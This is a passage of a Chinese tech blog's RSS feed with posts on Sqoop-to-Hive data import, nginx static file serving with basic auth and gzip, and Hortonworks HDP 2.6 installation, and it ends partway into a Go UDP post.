 | 2017-07-24 | 6                    |
 | 2017-07-25 | 2                    |
 | 2017-07-26 | 11                   |
 | 2017-07-27 | 56                   |
 | 2017-07-28 | 2                    |
 | 2017-07-29 | 28                   |
 | 2017-07-31 | 373                  |
 | 2017-08-01 | 96                   |
 | 2017-08-02 | 3                    |
 | 2017-08-03 | 2                    |
 | 2017-08-09 | 2                    |
 | 2017-08-15 | 1                    |
 | 2017-08-19 | 1                    |
 | 2017-09-02 | 4                    |
 | 2017-09-07 | 4                    |
 | 2017-09-08 | 1                    |
 | 2017-09-19 | 3                    |
 | 2017-10-10 | 1                    |
 | 2017-11-02 | 2                    |
 | 2017-11-03 | 1                    |
 | 2017-11-17 | 1                    |
 | 2017-11-29 | 1                    |
 | 2017-12-04 | 2                    |
 | 2017-12-05 | 1                    |
 | 2017-12-07 | 1                    |
 | 2017-12-15 | 1                    |
 -------------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;导入hive&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;将一张表导入hive：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意，需要使用hive用户：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# su - hive
$ sqoop-import --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P --table device --hive-import -m 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;导入后的数据可以从hdfs中看到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ hdfs dfs -ls /apps/hive/warehouse/device
Found 1 items
-rwxrwxrwx   3 hive hadoop      62177 2017-12-27 18:11 /apps/hive/warehouse/device/part-m-00000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;配置hive-site.xml的warehouse：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;property&amp;gt;
  &amp;lt;name&amp;gt;hive.warehouse.subdir.inherit.perms&amp;lt;/name&amp;gt;
  &amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;将所有表导入hive:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  # su - hive
  $ sqoop import-all-tables --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P --warehouse-dir /apps/hive/warehouse/IOT --hive-import --create-hive-table -m 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;指定目标目录（&amp;ndash;warehouse-dir /apps/hive/warehouse/IOT）：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;
&lt;p&gt;从hive导出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; $ sqoop export --connect jdbc:mysql://localhost/db --username root --table employee --export-dir /emp/emp_data
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Job管理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; sqoop job --list

 sqoop job --show &#39;jobname&#39;

 sqoop job --exec &#39;jobname&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;issue-1&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#issue-1&#34;&gt;
        ##
    &lt;/a&gt;
    Issue 1:
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;Application is added to the scheduler and is not yet activated. Queue&amp;rsquo;s AM resource limit exceeded. Details :
AM Partition = &amp;lt;DEFAULT_PARTITION&amp;gt;;
AM Resource Request = &amp;lt;memory:512, vCores:1&amp;gt;;
Queue Resource Limit for AM = &amp;lt;memory:512, vCores:1&amp;gt;;
User AM Resource Limit of the queue = &amp;lt;memory:512, vCores:1&amp;gt;;
Queue AM Resource Usage = &amp;lt;memory:1023, vCores:1&amp;gt;;&lt;/p&gt;
&lt;h1 id=&#34;创建工作流wfm&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%9b%e5%bb%ba%e5%b7%a5%e4%bd%9c%e6%b5%81wfm&#34;&gt;
        ##
    &lt;/a&gt;
    创建工作流(WFM)
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://community.hortonworks.com/articles/84394/apache-ambari-workflow-manager-view-for-apache-ooz-3.html&#34;&gt;https://community.hortonworks.com/articles/84394/apache-ambari-workflow-manager-view-for-apache-ooz-3.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1创建动作用sqoop获取数据&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1%e5%88%9b%e5%bb%ba%e5%8a%a8%e4%bd%9c%e7%94%a8sqoop%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae&#34;&gt;
        #
    &lt;/a&gt;
    1.创建动作用sqoop获取数据
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;​Create the Sqoop Action to Extract Data&lt;/p&gt;
&lt;p&gt;Command:
import &amp;ndash;connect jdbc:mysql://192.168.1.1/iot_test_12 &amp;ndash;username iot &amp;ndash;password-file /user/admin/iot.passwd &amp;ndash;table iottest &amp;ndash;split-by rowkey &amp;ndash;hive-import -m 1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/sqoop/wfm-sqoop-command.png&#34; alt=&#34;cmd&#34;&gt;&lt;/p&gt;
&lt;p&gt;Advanced -&amp;gt; File:&lt;/p&gt;
&lt;p&gt;/user/oozie/share/lib/lib_20171226172323/hive/hive-site.xml
&lt;img src=&#34;http://www.singleye.net/media/2017/12/sqoop/wfm-sqoop-adv.png&#34; alt=&#34;cmd&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2&#34;&gt;
        #
    &lt;/a&gt;
    2.
&lt;/div&gt;
&lt;/h2&gt;
&lt;h1 id=&#34;ambari-restart&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ambari-restart&#34;&gt;
        ##
    &lt;/a&gt;
    Ambari restart
&lt;/div&gt;
&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Shut down all services using Ambari.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Shutdown ambari-agents on all nodes.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Shutdown ambari-server.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Reboot all nodes as required .&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Restart ambari-server, agents and services in that order.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;hadoop&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#hadoop&#34;&gt;
        ##
    &lt;/a&gt;
    hadoop
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;停止Hadoop任务：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  hadoop job -kill job-id
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;misc&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#misc&#34;&gt;
        ##
    &lt;/a&gt;
    misc
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;apache-tezhttpstezapacheorg&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#apache-tezhttpstezapacheorg&#34;&gt;
        #
    &lt;/a&gt;
    &lt;a href=&#34;https://tez.apache.org&#34;&gt;Apache Tez&lt;/a&gt;
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;The Apache TEZ® project is aimed at building an application framework which allows for a complex directed-acyclic-graph of tasks for processing data. It is currently built atop Apache Hadoop YARN.&lt;/p&gt;
&lt;p&gt;Tez &amp;mdash; (manage DAG task)  &amp;mdash;&amp;gt; Yarn&lt;/p&gt;
&lt;p&gt;Empowering end users by:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Expressive dataflow definition APIs&lt;/li&gt;
&lt;li&gt;Flexible Input-Processor-Output runtime model&lt;/li&gt;
&lt;li&gt;Data type agnostic&lt;/li&gt;
&lt;li&gt;Simplifying deployment&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Execution Performance:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Performance gains over Map Reduce&lt;/li&gt;
&lt;li&gt;Optimal resource management&lt;/li&gt;
&lt;li&gt;Plan reconfiguration at runtime&lt;/li&gt;
&lt;li&gt;Dynamic physical data flow decisions&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://tez.apache.org/images/PigHiveQueryOnMR.png&#34; alt=&#34;Pig/Hive - MR&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://tez.apache.org/images/PigHiveQueryOnTez.png&#34; alt=&#34;Pig/Hive - TEZ&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HDP中提交的Hive查询任务通过Tez调度执行&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Nginx Static</title>
      <link>/2017/12/nginx-static/</link>
      <pubDate>Sat, 23 Dec 2017 19:41:39 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/12/nginx-static/</guid>
      <description>&lt;p&gt;nginx配置静态文件服务器&lt;/p&gt;
&lt;h1 id=&#34;搭建文件服务器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%90%ad%e5%bb%ba%e6%96%87%e4%bb%b6%e6%9c%8d%e5%8a%a1%e5%99%a8&#34;&gt;
        ##
    &lt;/a&gt;
    搭建文件服务器
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;要点就是root目录,会自动指向索引文件 如： index, index.html等&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server {
        client_max_body_size 4G;
        listen  80;  ## listen for ipv4; this line is default and implied
        server_name static.test.sdk.iwplay.com.tw;
        root /home/mini/Sync;
        location / {
        }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;建立索引&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bb%ba%e7%ab%8b%e7%b4%a2%e5%bc%95&#34;&gt;
        ##
    &lt;/a&gt;
    建立索引
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;建立目录索引也同样如此，不要带索引名称之类的文件，否则会直接显示文件，而不是目录&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server {
        client_max_body_size 4G;
        listen  80;  ## listen for ipv4; this line is default and implied
        server_name static.test.sdk.iwplay.com.tw;
        root /home/mini/Sync;
     location / {
         autoindex on; //显示索引
         autoindex_exact_size on; //显示大小
         autoindex_localtime on;   //显示时间
        }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;设置密码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%ae%be%e7%bd%ae%e5%af%86%e7%a0%81&#34;&gt;
        ##
    &lt;/a&gt;
    设置密码
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;搭建文件服务器有时候不想让别人任意访问，想做成一个私有的该怎么办呢，这个时候我们可以用到nginx自带的认证模块。 同样关键的是auth_basic/auth_basic_user_file字段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server {
        client_max_body_size 4G;
        listen  80;  ## listen for ipv4; this line is default and implied
        server_name static.test.sdk.iwplay.com.tw;
    root /home/mini/Sync;
     location / {
              auth_basic   &amp;quot;Restricted&amp;quot;;  
              auth_basic_user_file /etc/nginx/pass_file;
              autoindex on;
              autoindex_exact_size on;
              autoindex_localtime on;  
        }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;auth_basic表示的输入密码时的提示语&lt;/li&gt;
&lt;li&gt;auth_basic_user_file则显示认证时的用户密码文件存放路径&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;生成用户密码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%94%9f%e6%88%90%e7%94%a8%e6%88%b7%e5%af%86%e7%a0%81&#34;&gt;
        ##
    &lt;/a&gt;
    生成用户密码
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;上文实现了用户认证，那么如何添加用户呢。nginx自带了一个功能，如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;htpasswd -c -d /etc/nginx/pass_file username
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样就在/etc/nginx/pass_file 中添加了了一个用户&lt;/p&gt;
&lt;h1 id=&#34;开启压缩&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bc%80%e5%90%af%e5%8e%8b%e7%bc%a9&#34;&gt;
        ##
    &lt;/a&gt;
    开启压缩
&lt;/div&gt;
&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;server {
  client_max_body_size 4G;
  listen  80;  ## listen for ipv4; this line is default and implied
  server_name static.test.sdk.iwplay.com.tw;
  root /home/mini/Sync;
  
  # new config lines for gzip
  gzip on;
  gzip_min_length 1k;
  gzip_buffers 4 8k;
  gzip_http_version 1.1;
  gzip_types text/plain application/javascript application/x-javascript text/javascript text/css application/xml;
   
   location / {
       auth_basic   &amp;quot;Restricted&amp;quot;;  
       auth_basic_user_file /etc/nginx/pass_file;
       autoindex on;
       autoindex_exact_size on;
       autoindex_localtime on;  
   }
}&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Horwonworks HDP 2.6安装过程</title>
      <link>/2017/12/horwonworks-hdp-2.6%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</link>
      <pubDate>Sat, 23 Dec 2017 15:38:37 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/12/horwonworks-hdp-2.6%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</guid>
      <description>&lt;h1 id=&#34;安装ambari-server&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85ambari-server&#34;&gt;
        ##
    &lt;/a&gt;
    安装ambari-server
&lt;/div&gt;
&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;# yum install ambari-server
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;配置ambari-cluster&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%85%8d%e7%bd%aeambari-cluster&#34;&gt;
        ##
    &lt;/a&gt;
    配置ambari cluster
&lt;/div&gt;
&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;# ambari-server setup
# ambari-server start
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;配置cluster&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%85%8d%e7%bd%aecluster&#34;&gt;
        ##
    &lt;/a&gt;
    配置cluster
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;步骤1:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将clsuter中的所有node设置成ssh免密码登录了的方式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤2:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;访问 http://&amp;lt;ambari-server&amp;gt;:8080&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤3:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;设置cluster名称&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/hdp/hdp-setup-001.png&#34; alt=&#34;001&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤4:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;配置安装源，可以使用私有源：&lt;/p&gt;
&lt;p&gt;HDP私有源：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://hdp-repo.iwaterdata.com:7300/HDP/centos7/2.x/updates/2.6.3.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;HDP-UTILS私有源：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://hdp-repo.iwaterdata.com:7300/HDP-UTILS-1.1.0.21/repos/centos7
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/hdp/hdp-setup-002.png&#34; alt=&#34;002&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤5:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装程序检查配置节点&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/hdp/hdp-setup-003.png&#34; alt=&#34;003&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤6:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;选择安装软件列表&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/hdp/hdp-setup-004.png&#34; alt=&#34;004&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤7:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;设置各软件的配置信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/hdp/hdp-setup-005.png&#34; alt=&#34;005&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤8:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装完成后程序会尝试启动各服务，有可能启动会失败（比如内存不足无法启动所有程序），只要确定程序正确安装可以继续&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/hdp/hdp-setup-006.png&#34; alt=&#34;006&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;misc&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#misc&#34;&gt;
        ##
    &lt;/a&gt;
    misc
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;设置JDBC driver(Customize service中 oozie需要)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>golang UDP中Read()/ReadFromUDP()/Write()/WriteToUDP()的使用</title>
      <link>/2017/12/golang-udp%E4%B8%ADread/readfromudp/write/writetoudp%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Tue, 05 Dec 2017 15:19:40 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/12/golang-udp%E4%B8%ADread/readfromudp/write/writetoudp%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>&lt;p&gt;学习golang进行UDP client/server通讯的过程中发现Read/ReadFromUDP/Write/WriteToUDP的使用有些需要注意之处，这里记录一下。&lt;/p&gt;
&lt;h2 id=&#34;代码实验&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bb%a3%e7%a0%81%e5%ae%9e%e9%aa%8c&#34;&gt;
        #
    &lt;/a&gt;
    代码实验
&lt;/div&gt;
&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;udp-server&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#udp-server&#34;&gt;
        ##
    &lt;/a&gt;
    UDP server
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;UDP服务器端在调用&amp;quot;net.ListenUDP()&amp;ldquo;后创建&amp;quot;net.UDPConn&amp;rdquo;，read/write操作是通过这个UDPConn来完成的。因为listen的时候只指定了本地绑定的地址，它只能被动的接收来自客户端的消息，因此这个UDPConn在golang中为&amp;rsquo;unconnected&amp;rsquo;类型的。&lt;/p&gt;
&lt;p&gt;这种类型的UDPConn的读操作可以接受Read()及ReadFromUDP()。区别是Read()无法知道远程连接的地址信息而ReadFromUDP()可以，所以如果后续需要跟远程进行双向通讯需要使用ReadFromUDP()。&lt;/p&gt;
&lt;p&gt;这种类型的UDPConn在进行写操作时必须使用WriteToUDP()完成，并且需要指定对方的地址信息。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;34
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;35
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;36
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;37
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;38
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;39
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;40
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;41
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;42
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;43
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;44
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;45
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;46
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;47
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;48
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
